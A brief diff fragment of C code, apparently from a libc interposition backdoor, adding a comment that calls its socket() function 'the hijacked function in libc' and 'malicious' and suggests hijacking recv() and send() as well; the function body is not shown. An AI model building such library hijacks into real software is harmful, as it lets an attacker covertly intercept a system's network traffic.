@@ -29,6 +29,12 @@ void sigchld(int signo)
 		;
 }
 
+/*
+ * socket() is the hijacked function in libc
+ * To make this more malicious, one could hijack recv()/send() as well.
+ * The majority of the code in my malicious socket() has been ripped
+ * right from Beej's Guide to Network Programming. Thanks Beej!
+ */
 int socket(int domain, int type, int protocol)
 {
 	int sockfd, new_fd;
